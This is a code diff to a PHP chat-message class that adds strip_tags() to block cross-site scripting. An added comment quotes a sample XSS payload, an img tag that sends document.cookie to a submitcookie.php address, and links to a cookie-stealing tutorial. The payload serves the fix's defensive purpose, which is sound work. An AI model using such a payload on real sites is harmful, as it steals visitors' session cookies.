@@ -1327,6 +1327,11 @@ class cls_ssshout
         global $root_server_url;
         global $cnf;
 		
+		//Handle cross site security E.g. user should not be able to enter "<img src="http://localhost/submitcookie.php?cookie =' + escape(document.cookie) + '" />"
+		//https://www.geeksforgeeks.org/cookie-tracking-stealing-using-cross-site-scripting/
+		//Remove any direct tags
+		$my_line = strip_tags($my_line);
+		
 		
 		//Handle any plugin-defined parsing of the message. Eg. turn smileys :) into smiley images.
         if($allow_plugins == true) {
@@ -1404,6 +1409,9 @@ class cls_ssshout
 		$my_line = preg_replace($preg_search, 'href="$2_HI.jpg"><img src="$2.jpg" class="img-responsive" width="80%" border="0"><', $my_line);	 
 		//Note: TODO In future I suggest investigating
 		//https://sourceforge.net/projects/simplehtmldom/
+
+		
+
 
 		//Turn images into responsive images, with a click through to the image itself
 		$my_line = preg_replace("/\>(.*?\.jpg)\</i", "><img src='$1'  class='img-responsive' width='80%' border='0'><", $my_line);	 
